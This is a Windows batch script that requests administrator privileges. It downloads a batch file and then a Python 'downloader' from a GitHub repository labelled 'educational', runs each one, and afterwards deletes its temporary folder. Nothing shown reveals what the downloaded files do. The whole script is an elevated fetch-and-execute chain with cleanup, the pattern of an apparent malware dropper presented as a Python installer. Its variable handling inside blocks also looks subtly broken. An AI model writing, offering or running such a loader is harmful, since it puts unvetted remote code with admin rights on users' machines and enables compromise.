@echo off
color 70

:: -------------------------------
:: Check for admin rights
:: -------------------------------
net session >nul 2>&1
if not "%errorlevel%"=="0" (
    echo Requesting administrative privileges...
    powershell -NoProfile -Command "Start-Process '%~f0' -ArgumentList '%*' -Verb RunAs"
    exit /b
)

:: -------------------------------
:: FIRST RUN
:: -------------------------------
if /i "%~1" neq "rerun" (

    echo First execution...
    echo Running as administrator

    set "WORKDIR=%TEMP%\MyTempWork"

    if not exist "%WORKDIR%" mkdir "%WORKDIR%"
    cd /d "%WORKDIR%" || exit /b 1

    set "URL=https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/download/installpython.bat"
    set "FILE=installpython.bat"

    echo Downloading Python installer...
    powershell -NoProfile -Command "Invoke-WebRequest '%URL%' -OutFile '%FILE%'"

    if not exist "%FILE%" (
        echo Download failed.
        pause
        exit /b
    )

    call "%FILE%"

    echo Waiting for PATH refresh...
    timeout /t 1 /nobreak >nul

    echo Relaunching script for second phase...
    start "" "%~f0" rerun

    exit /b
)

:: -------------------------------
:: SECOND RUN
:: -------------------------------
echo Second run with updated PATH

pip install requests

set "URL=https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/download/downloader.py"
set "DEST=downloader.py"

echo Downloading downloader.py...
powershell -NoProfile -Command "Invoke-WebRequest '%URL%' -OutFile '%DEST%'"

if not exist "%DEST%" (
    echo Python downloader download failed.
    pause
    exit /b
)

python "%DEST%"

:: -------------------------------
:: CLEANUP
:: -------------------------------
echo Cleaning temporary files...

set "WORKDIR=%TEMP%\MyTempWork"

cd /d "%TEMP%"
if exist "%WORKDIR%" (
    rd /s /q "%WORKDIR%"
)

echo Done.
pause
